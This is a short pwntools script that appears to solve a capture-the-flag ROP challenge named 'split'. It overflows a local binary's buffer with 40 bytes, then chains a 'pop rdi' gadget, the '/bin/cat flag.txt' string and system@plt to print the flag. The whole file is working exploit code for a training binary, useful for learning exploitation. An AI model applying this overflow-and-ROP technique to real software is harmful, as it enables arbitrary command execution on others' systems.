from pwn import *

#context.log_level = 'DEBUG'

filename = './split'

binary = ELF(filename)
cat_flag_addr = next(binary.search('/bin/cat flag.txt'))
system_plt = binary.plt['system']

rop = ROP(filename)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

p = process(filename)

p.recvuntil('> ')

payload = ''
payload += 'A' * 40 
payload += p64(pop_rdi) 
payload += p64(cat_flag_addr)
payload += p64(system_plt)

p.sendline(payload)

print "Flag:", p.recv(1024)
